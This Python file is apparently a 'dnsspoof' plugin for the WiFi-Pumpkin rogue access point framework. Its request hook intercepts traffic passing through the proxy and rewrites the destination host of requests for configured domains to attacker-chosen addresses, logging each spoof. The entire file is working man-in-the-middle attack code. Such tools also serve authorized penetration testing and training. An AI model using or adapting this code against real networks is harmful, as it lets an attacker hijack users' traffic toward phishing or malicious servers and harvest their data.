import re
from ast import literal_eval 
from plugins.extension.plugin import PluginTemplate

"""
Description:
    This program is a core for wifi-pumpkin.py. file which includes functionality
    plugins for Pumpkin-Proxy.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

parse_host_header = re.compile(r"^(?P<host>[^:]+|\[.+\])(?::(?P<port>\d+))?$")

class DNSspoof(PluginTemplate):
    meta = {
        'Name'      : 'dnsspoof',
        'Version'   : '1.0',
        'Description' : 'directing a Domain Name Server (DNS) and all of its requests.',
        'Author'    : 'Marcos Nesster',
    }

    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.dict_domain = {}
        self.ConfigParser = True
        self.getAllDomainToredict()

    def getAllDomainToredict(self):
        self.domains = self.config.get_all_childname('set_dnsspoof')
        for item in self.domains:
            if item.startswith('domain'):
                indomain = literal_eval(str(self.config.get_setting('set_dnsspoof',item)))
                self.dict_domain.update(indomain)

    def request(self, flow):
        for domain in self.dict_domain.keys():
            if re.search(domain,flow.request.pretty_host):
                if flow.client_conn.ssl_established:
                    flow.request.scheme = "https"
                    sni = flow.client_conn.connection.get_servername()
                    port = 443
                else:
                    flow.request.scheme = "http"
                    sni = None
                    port = 80

                host_header = flow.request.pretty_host
                m = parse_host_header.match(host_header)
                if m:
                    host_header = m.group("host").strip("[]")
                    if m.group("port"):
                        port = int(m.group("port"))
                flow.request.port = port
                flow.request.host = self.dict_domain[domain]
                self.send_output.emit('[dnsspoof]:: {} spoofed DNS response'.format(domain))

    def response(self, flow):
        pass